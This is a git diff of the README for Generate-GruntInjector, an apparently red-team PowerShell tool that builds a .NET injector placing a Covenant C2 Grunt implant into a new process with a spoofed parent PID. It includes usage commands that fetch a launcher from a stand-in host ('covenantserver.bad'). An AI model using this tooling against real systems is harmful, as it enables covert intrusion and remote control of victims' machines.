@@ -1,6 +1,6 @@
-# covenant-grunt-injection# Generate-GruntInjector
+# Generate-GruntInjector
 
-A PowerShell script that turns a Covenant Grunt launcher into a .NET assembly that can be coupled with Covenant's Assembly command to achieve process injection in Covenant.
+A PowerShell script that turns a Covenant Grunt launcher into a .NET assembly that can be coupled with Covenant's `Assembly` command to achieve process injection in Covenant.
 
 ## Installation / Getting started
 
@@ -28,7 +28,7 @@ Run `Generate-GruntInjector` with the URL the Binary Launcher is hosted on, the 
 
 This produces a Grunt injector, which by default is named `GruntInjector_<timestamp>_v<.NET Framework version>.exe`. This .NET assembly injects a Grunt into an new, arbitrary process with an arbitrary PPID. 
 
-Check which processes are running on the target with your functional grunt. I'll be using the PID of this `powershell.exe` process as my PPID.
+Check which processes are running on the target with your functional Grunt. I'll be using the PID of this `powershell.exe` process as my PPID.
 
 ![](gif/examine-processes.gif)
   
@@ -46,61 +46,70 @@ Click `Task` and profit!
 
 ![](gif/confirm-injection.gif)
 
-#### Argument 1
+### Arguments
+#### LauncherURL
 Type: `String`  
-Default: `'default value'`
 
-State what an argument does and how you can use it. If needed, you can provide
-an example below.
+URL of the Grunt binary launcher hosted on your Covenant server. It will be downloaded from the Covenant server and inserted into the injection assembly. 
 
-Example:
-```bash
-awesome-project "Some other value"  # Prints "You're nailing this readme!"
+```cmd
+Generate-GruntInjector.ps1 -LauncherURL https://covenantserver.bad/woo
 ```
 
-#### Argument 2
-Type: `Number|Boolean`  
-Default: 100
+#### InputFile
+Type: `String`
 
-Copy-paste as many of these as you need.
+Full path to the Grunt binary launcher on disk. It will be read and inserted into the injection assembly.
 
-## Contributing
+```cmd
+Generate-GruntInjector.ps1 -InputFile C:\Users\covenant\Desktop\launcher.exe
+```
 
-When you publish something open source, one of the greatest motivations is that
-anyone can just jump in and start contributing to your project.
+#### DotNetFrameworkVersion
+Type: `Float`
 
-These paragraphs are meant to welcome those kind souls to feel that they are
-needed. You should state something like:
+Options: `3.5` or `4.0`
 
-"If you'd like to contribute, please fork the repository and use a feature
-branch. Pull requests are warmly welcome."
+Default: `4.0`
 
-If there's anything else the developer needs to know (e.g. the code style
-guide), you should link it here. If there's a lot of things to take into
-consideration, it is common to separate this section to its own file called
-`CONTRIBUTING.md` (or similar). If so, you should say that it exists here.
+Specifies which version of the .NET Framework to compile the injection assembly against. 
+
+**IMPORTANT**: This should match the .NET Framework version that the original Grunt binary launcher was compiled against. You can view and modify this on the Launcher > Binary page. You must have which ever version you choose installed on your machine.
+
+```cmd
+Generate-GruntInjector.ps1 -LauncherURL https://covenantserver.bad/woo -DotNetFrameworkVersion 3.5
+```
+
+#### DonutPath
+Type: `String`
+
+Default: `"donut.exe"`
+
+Full path to donut.exe. Installation instructions found [here](https://github.com/TheWover/donut).
+
+```cmd
+Generate-GruntInjector.ps1 -LauncherURL https://covenantserver.bad/woo -DonutPath C:\Users\covenant\Desktop\donut\donut.exe
+```
+
+#### Outfile
+Type: `String`
+
+Default: `"GruntInjector_<timestamp>_v<.NET Framework version>.exe"`
+
+Full path to write the injector assembly to.
+
+```cmd
+Generate-GruntInjector.ps1 -LauncherURL https://covenantserver.bad/woo -Outfile C:\Users\covenant\Desktop\covenant\injector.exe
+```
 
 ## Links
 
-Even though this information can be found inside the project on machine-readable
-format like in a .json file, it's good to include a summary of most useful
-links to humans using your project. You can include links like:
+This project is merely an automation of [Rasta Mouse's](https://rastamouse.me) [Covenant/Donut process injection technique](https://rastamouse.me/2019/08/covenant-donut-tikitorch/). All creds to him for doing the heavy thinking!
 
-- Project homepage: https://your.github.com/awesome-project/
-- Repository: https://github.com/your/awesome-project/
-- Issue tracker: https://github.com/your/awesome-project/issues
-  - In case of sensitive bugs like security vulnerabilities, please contact
-    my@email.com directly instead of using issue tracker. We value your effort
-    to improve the security and privacy of this project!
-- Related projects:
-  - Your other project: https://github.com/your/other-project/
-  - Someone else's project: https://github.com/someones/awesome-project/
+The project relies heavily on [Donut](https://github.com/TheWover/donut), a phenomenal project that allows us to convert the Grunt launcher .NET assembly into position-independent shellcode. Thank you, [TheWover](https://thewover.github.io) and [Odzhan](https://modexp.wordpress.com)!
 
+This project is a helper tool for [Cobbr's](https://cobbr.io) [Covenant](https://github.com/cobbr/Covenant). Thanks for pioneering such a great project!
 
 ## Licensing
 
-One really important part: Give your project a proper license. Here you should
-state what the license is and how to find the text version of the license.
-Something like:
-
-"The code in this project is licensed under MIT license."
+The code in this project is licensed under MIT license.
